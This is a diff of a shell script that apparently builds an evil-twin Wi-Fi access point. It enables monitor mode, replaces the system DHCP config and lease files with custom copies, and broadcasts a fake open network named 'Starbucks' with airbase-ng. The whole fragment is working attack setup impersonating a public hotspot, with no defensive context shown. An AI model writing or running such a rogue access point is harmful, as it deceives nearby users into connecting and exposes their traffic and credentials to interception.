@@ -8,6 +8,8 @@ airmon-ng start wlan1
 
 mv /etc/dhcp/dhcpd.conf /etc/dhcp/dhcpd-backup.conf
 cp dhcpd.conf /etc/dhcp/dhcpd.conf
+mv /var/lib/dhcp/dhcpd.leases /var/lib/dhcp/dhcpd-backup.leases
+cp dhcpd.leases /var/lib/dhcp/dhcpd.leases
 
 airbase-ng -e Starbucks -c 11 wlan1mon
 ifconfig at0 up
